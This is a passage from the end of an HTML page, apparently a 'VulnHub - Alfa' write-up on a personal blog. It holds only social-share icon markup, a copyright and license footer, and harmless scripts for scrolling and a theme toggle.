16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share VulnHub - Alfa on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fvulnhub%2falfa%2f&title=VulnHub%20-%20Alfa&summary=VulnHub%20-%20Alfa&source=https%3a%2f%2ffahmifj.github.io%2fvulnhub%2falfa%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share VulnHub - Alfa on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fvulnhub%2falfa%2f&title=VulnHub%20-%20Alfa"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share VulnHub - Alfa on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fvulnhub%2falfa%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share VulnHub - Alfa on whatsapp" href="https://api.whatsapp.com/send?text=VulnHub%20-%20Alfa%20-%20https%3a%2f%2ffahmifj.github.io%2fvulnhub%2falfa%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share VulnHub - Alfa on telegram" href="https://telegram.me/share/url?text=VulnHub%20-%20Alfa&url=https%3a%2f%2ffahmifj.github.io%2fvulnhub%2falfa%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></div></main><footer class=footer><span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a>&nbsp;&&nbsp;<a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>&nbsp;(mod)</span>
<span><span class=copyright>&copy; 2022&nbsp;<a href=https://fahmifj.github.io/about>Fahmi FJ</a></span>
&nbsp;·&nbsp;
<span class=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/>CC BY-NC-SA 4.0</a></span></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>